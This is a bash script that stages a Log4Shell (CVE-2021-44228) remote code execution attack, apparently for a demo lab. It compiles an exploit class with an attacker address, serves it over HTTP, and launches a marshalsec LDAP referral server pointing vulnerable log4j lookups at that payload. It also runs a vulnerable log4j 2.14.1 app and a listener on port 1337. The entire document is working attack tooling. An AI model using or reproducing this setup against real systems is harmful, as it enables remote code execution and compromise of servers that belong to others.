#!/bin/bash

cd /CVE-2021-44228-Apache-Log4j-Rce/src/main/java
sed -i "s/ADDRESS/$1:1337/g" Exploit.java
javac Exploit.java
python3 -m http.server 8888&

wget https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.zip && unzip apache-log4j-2.14.1-bin.zip
javac -cp apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar log4jhttp.java
java -cp apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar:. log4jhttp&

cd /marshalsec/target
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$1:8888/#Exploit"&

cd /
python3 -m http.server 1337
